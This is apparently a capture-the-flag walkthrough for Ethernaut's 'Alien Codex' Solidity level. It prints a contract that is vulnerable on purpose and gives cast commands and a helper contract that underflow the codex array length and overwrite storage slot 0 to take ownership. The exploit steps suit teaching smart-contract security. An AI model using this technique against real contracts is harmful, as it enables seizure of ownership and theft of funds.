## Alien Codex Level Outline

**Difficulty : 7/10**

You've uncovered an Alien contract. Claim ownership to complete the level.

```solidity  
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import '../helpers/Ownable-05.sol';

contract AlienCodex is Ownable {

  bool public contact;
  bytes32[] public codex;

  modifier contacted() {
    assert(contact);
    _;
  }
  
  function make_contact() public {
    contact = true;
  }

  function record(bytes32 _content) contacted public {
  	codex.push(_content);
  }

  function retract() contacted public {
    codex.length--;
  }

  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }
}
```

[Link to level on Ethernaut](https://ethernaut.openzeppelin.com/level/0xda5b3Fb76C78b6EdEE6BE8F11a1c31EcfB02b272)

## Solution

Inherited contracts share the same storage slot with their derived contracts. 

Meaning we need to modify storage slot 0 to complete this level as that is where the variable `owner` will live.

Remember that dynamic arrays are not stored contiguously in storage. Instead their intended **storage slot contains the size of the dynamic array** and to find the memory address where the dynamic array's element are stored, we have to calculate a keccak256 hash.

```
memory_address = keccak256(p)

where
- - -  
memory_address  : address of starting element of dynamic array
p               : storage position of dynamic array
```
> in our case, p = 1 as `address owner` and `bool contact` sharing storage slot 0 as both variables are less than 32bytes

### Walkthrough
##### 1. Call `make_contact()` so that we can satisfy the `contacted()` modifier
```console
cast send $LEVEL_ADDRESS "make_contact()" --private-key $PRIVATE_KEY
```

##### 2. Let's inspect storage and confirm that we need to target storage slot 1
```console
cast storage $LEVEL_ADDRESS 0
```
output :
```
0x000000000000000000000001da5b3fb76c78b6edee6be8f11a1c31ecfb02b272
```

let's also find the current contract owner
```console
cast call $LEVEL_ADDRESS "owner()"
```
output :
```
0x000000000000000000000000da5b3fb76c78b6edee6be8f11a1c31ecfb02b272
```

we can see that the variable `address owner` and `bool contact` have been packed into storage slot 0. We want to attack this storage slot to change the owner variable value to our address.

this means that stroage slot 1 will hold the length of our dynamic array `codex`

```console
cast storage $LEVEL_ADDRESS 1
```
output
```
0x0000000000000000000000000000000000000000000000000000000000000000
```
> this is correct as codex initially starts with a size of 0

##### 3. Forcing a underflow
if we call the `retract()` method, the length of `codex` will underflow resulting in the array having a length of 2^256, which is the same size as the total contract storage as the EVM reserves 2^256 slots of 32 bytes.

```console
cast send $LEVEL_ADDRESS "retract()" --private-key $PRIVATE_KEY
```

let's confirm that the underflow was succesful by checking storage slot 1 (which will hold the length of the array)
```console
cast storage $LEVEL_ADDRESS 1
```
output :
```
0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
```


##### 3. Calculating attack parameters to modify storage slot 0
now that the length of `codex` is equal to the size of the contract storage, we can use the function `revise(uint,bytes32)` to modify any storage slot.

we know that the `owner` variable is located at storage slot 0, we have to provide an index to `revise(uint,bytes32)` such that it will overflow the maximal length of `codex` and point to storage slot 0.

calculation of index **revise_index** to cause an overflow to storage slot 0

```
codex_memory_address = keccak256(bytes32(1))

revise_index = 2^256 - codex_memory_address
```

to quickly calculate **revise_index**, open remix and run the following contract

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.4.8;

contract Calc {
    uint256 public revise_index;

    function getIndex() public {
        bytes32 codex_index = keccak256(bytes32(uint256(1)));
        revise_index = 2 ** 256 - 1 - uint(codex_index) + 1;
    }
}
```
> credit to [Igor Yalovoy](https://ylv.io/ethernaut-alien-codex-solution/) for the script

returns a value of :

```
revise_index=35707666377435648211887908874984608119992236509074197713628505308453184860938
```

when we call `revise(uint,bytes32)` with the value above as the index, it will overflow `codex` and point to storage slot 0. We can prove this quickly by adding the memory address of 'codex' with `revise_index` together

```
// codex memory address
0x4EF1D2AD89EDF8C4D91132028E8195CDF30BB4B5053D4F8CD260341D4805F30A 

// revise_index (in hex)
0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6

// adding them together yields 
0x10000000000000000000000000000000000000000000000000000000000000000

// which overflows to 
0x0000000000000000000000000000000000000000000000000000000000000000
```
> bonus : we can target any address below `codex's memory address` by adding the index of the storage slot that we want to attack to `revise_index` e.g. to attack storage slot 3, we would calculate `revise_index = revise_index + 3`

##### 4. Sending transaction to complete level

we first need to **left pad** our EOA address because the address data type requires 20bytes but `revise` requires us to send it 32bytes
```
// example EOA
0x8aFF5cA996F77487a4f04F1ce905Bf3d27455580

// left-padding EOA with 12 bytes
0x0000000000000000000000008aFF5cA996F77487a4f04F1ce905Bf3d27455580
```
> one bytes 2^8 bits which is represented using 2 hex digits. so we left pad 12*2 zeros

```console
cast send $LEVEL_ADDRESS "revise(uint,bytes32)" 35707666377435648211887908874984608119992236509074197713628505308453184860938 \
$LEFT_PADDED_EOA --private-key $PRIVATE_KEY
```

## Further Reading
[Write up to a similar problem](https://weka.medium.com/announcing-the-winners-of-the-first-underhanded-solidity-coding-contest-282563a87079)


---

##### [:arrow_left: Back To Main Menu](../README.md)
